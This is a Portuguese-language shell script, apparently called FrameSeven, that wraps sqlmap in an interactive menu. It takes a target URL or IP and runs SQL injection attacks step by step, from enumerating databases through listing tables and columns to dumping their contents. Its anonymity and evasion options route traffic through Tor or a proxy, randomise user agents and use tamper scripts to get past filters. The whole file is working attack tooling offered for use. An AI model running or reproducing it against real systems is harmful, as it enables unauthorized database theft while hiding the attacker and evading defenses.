#!/bin/sh
# Author: SaySeven
# Little hacks and compatibility improvments by Luiz Antonio Rangel (a.k.a luiztheblues)

alias install_sqlmap='apt-get install sqlmap -y'
alias install_tor='apt-get install tor -y'

if [ `whoami` != 'root' ];then
    printf '%s\n' 'Para rodar esse script, é necessário ser root.'
    exit 1
fi

check_sqlmap=$(which sqlmap)
if [ $? != 0 ]; then
    printf '%s' '[DEPENDENCIA] SQLmap não está instalado; desaja instalar [y/n]? ' 
    read yeah
    if printf '%s' "${yeah}" | grep -iq '^y'; then
      install_sqlmap
    else
      printf '%s\n' 'Sem o Sqlmap, não tenho como funcionar.'
    fi
fi
unset yeah # We don't need it in the memory anymore.

check_tor=$(which tor)

if [ $? != 0 ]; then
    printf '%s' '[OPCIONAL] Tor não está instalado; deseja instalar [y/n]? '
    read yeah
    if printf '%s' "${yeah}" | grep -iq '^y'; then
      install_tor
    else
      printf '%s\n' '"Pulando" dependência opicional.'
    fi
fi 
unset yeah


cat <<!

    ______   _____      __      __    __    _____    __ ___   ______    _____  _     _    _____  __   __   
    / ____/\ / ___ (    /\_\    /_/\  /\_\  /\___/\  /_/\__/\ / ____/\ /\_____\/_/\ /\_\ /\_____\/_/\ /\_\  
    ) ) __\// /\_/\ \  ( ( (    ) ) \/ ( ( / / _ \ \ ) ) ) ) )) ) __\/( (_____/) ) ) ( (( (_____/) ) \ ( (  
     \ \ \ / /_/ (_\ \  \ \_\  /_/ \  / \_\\ \(_)/ //_/ /_/ /  \ \ \   \ \__\ /_/ / \ \_\\ \__\ /_/   \ \_\ 
     _\ \ \\ \ )_/ / (  / / /__\ \ \\// / // / _ \ \\ \ \_\/   _\ \ \  / /__/_\ \ \_/ / // /__/_\ \ \   / / 
    )____) )\ \/_\/ \_\( (_____()_) )( (_(( (_( )_) ))_) )    )____) )( (_____\\ \   / /( (_____\)_) \ (_(  
    \____\/  \_____\/_/ \/_____/\_\/  \/_/ \/_/ \_\/ \_\/     \____\/  \/_____/ \_\_/_/  \/_____/\_\/ \/_/ 
                                                    FrameSeven Version 1.1 by: SaySeven


!
printf '%s' 'Digite a URL ou o IP do alvo: '
read alvo
printf "\
1) SQLmap padrão
2) SQLmap furtivo
3) SQLmap com Tor
4) SQLmap com proxy
5) SQLmap bypass + furtivo + Tor\n"

printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
read op

case "${op}" in
	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --dbs --no-cast --answers=ANSWERS;;
	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
	3) service tor start && sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
	4) printf '%s' 'Insira IP do proxy HTTP: '; read proxy; printf '%s' "Insira a porta do proxy: "; read port; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://${proxy}:${port}" --time-sec 7 --dbs --no-cast --answers=ANSWERS;;
  5) service tor start; sleep 3; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --dbs --no-cast --answers=ANSWERS;;
  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;; 
esac
unset op

printf '%s' 'Digite o banco de dados que você deseja proseguir com o ataque: ' 
read db

printf "\
1) SQLmap padrão
2) SQLmap furtivo
3) SQLmap com Tor
4) SQLmap com proxy
5) SQLmap bypass + furtivo + Tor\n"
printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
read op

case "${op}" in
	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 -D "${db}" --tables --no-cast --answers=ANSWERS;;
	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D "${db}" --tables --no-cast --answers=ANSWERS;;
	3) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D "${db}" --tables --no-cast --answers=ANSWERS;;
	4) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://${proxy}:${port}" --time-sec 7 -D "${db}" --tables --no-cast --answers=ANSWERS;;
  5) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D "${db}" --tables --no-cast --answers=ANSWERS;;
  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;; 
esac
unset op

printf '%s' 'Digite a tabela que você deseja proseguir com o ataque: '
read tb

printf "\
1) SQLmap padrão
2) SQLmap furtivo
3) SQLmap com Tor
4) SQLmap com proxy
5) SQLmap bypass + furtivo + Tor\n"
printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
read op

case "${op}" in
	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
	3) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
	4) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://${proxy}:${port}" --time-sec 7 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
  5) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;; 
esac
unset op

printf '%s' 'Digite as colunas que você deseja dumpar: '
read cl

printf "\
1) SQLmap padrão
2) SQLmap furtivo
3) SQLmap com Tor
4) SQLmap com proxy
5) SQLmap bypass + furtivo + Tor\n"
printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
read op

case "${op}" in #Dumpar colunas
	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
	3) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
	4) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
  5) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;;
esac

unset op alvo db tb cl # Clean up memory
service tor stop # Stop Tor service if it stills running
exit
